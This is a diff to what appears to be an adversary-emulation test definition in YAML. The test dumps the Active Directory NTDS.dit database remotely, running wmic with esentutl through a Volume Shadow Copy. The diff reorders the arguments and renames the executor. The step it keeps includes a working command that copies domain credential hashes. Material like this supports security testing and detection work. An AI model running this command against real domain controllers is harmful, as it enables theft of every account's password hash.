@@ -4,15 +4,15 @@ description: |
     This test is intended to be run from a remote workstation with domain admin context.
     The Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy created with esentutl.
 args:
+    - name: target_host
+      type: string
+      default: localhost
     - name: source_path
       type: string
       default: c:\\windows\\ntds\\ntds.dit
     - name: target_path
       type: string
       default: c:\\ntds.dit
-    - name: target_host
-      type: string
-      default: localhost
 uuid: 21c7bf80-3e8b-40fa-8f9d-f5b194ff2865
 mitre:
     tactics:
@@ -29,4 +29,4 @@ steps:
     - name: create-volume-shadow-copy-remotely-(wmi)-with-esentutl
       inline: |
         wmic /node:"{{.Args.target_host}}" process call create "cmd.exe /c esentutl.exe /y /vss {{.Args.source_path}} /d {{.Args.target_path}}"
-      executor: command_prompt
+      executor: cmd
